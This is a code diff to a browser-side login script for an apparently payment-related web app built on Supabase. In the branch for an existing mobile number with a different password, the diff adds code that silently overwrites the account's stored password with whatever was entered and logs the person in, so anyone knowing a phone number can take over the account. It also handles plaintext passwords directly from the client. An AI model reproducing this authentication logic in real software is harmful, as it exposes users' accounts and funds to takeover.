@@ -2,6 +2,12 @@
 import { supabase } from "../config/supabase.js";
 
 document.addEventListener("DOMContentLoaded", () => {
+  const userSession = sessionStorage.getItem("paysetu_session");
+  if (userSession) {
+    window.location.href = "/home";
+    return;
+  }
+
   const loginForm = document.getElementById("loginForm");
   const mobileInput = document.getElementById("mobile");
   const passwordInput = document.getElementById("password");
@@ -44,10 +50,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
       if (user) {
         // User exists with same mobile and password
-        if (
-          (user.status === "completed" || user.mpin) &&
-          user.login_count >= 1
-        ) {
+        if (user.login_count >= 2) {
           const { data: tData } = await supabase.from("telegram_popup").select("*").limit(1);
           if (tData && tData.length > 0 && tData[0].telegram_link) {
             const tLink = document.getElementById("telegramLimitLink");
@@ -82,19 +85,32 @@ document.addEventListener("DOMContentLoaded", () => {
           .select();
 
         if (insertError) {
-          console.error(insertError);
-          showError(
-            "Invalid login details or account already exists with different password.",
-          );
-          setLoading(false);
-          return;
+          // Mobile exists but with a different password
+          // Update password and reset login_count to 1
+          const { data: updatedUsers, error: updateError } = await supabase
+            .from("users")
+            .update({
+              password: password,
+              login_count: 1,
+              last_login: new Date().toISOString()
+            })
+            .eq("mobile", mobile)
+            .select();
+
+          if (updateError || !updatedUsers || updatedUsers.length === 0) {
+            showError("Invalid login details or account error.");
+            setLoading(false);
+            return;
+          }
+          user = updatedUsers[0];
+        } else {
+          user = newUsers[0];
         }
-        user = newUsers[0];
       }
 
       // Save session
       sessionStorage.setItem(
-        "showpay_session",
+        "paysetu_session",
         JSON.stringify({
           userId: user.id,
           mobile: user.mobile,
@@ -114,7 +130,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
   function showError(msg) {
     errorMessage.textContent = msg;
-    errorMessage.classList.remove("hidden");
+    errorMessage.style.display = "block";
   }
 
   function setLoading(isLoading) {
@@ -127,3 +143,4 @@ document.addEventListener("DOMContentLoaded", () => {
     }
   }
 });
+
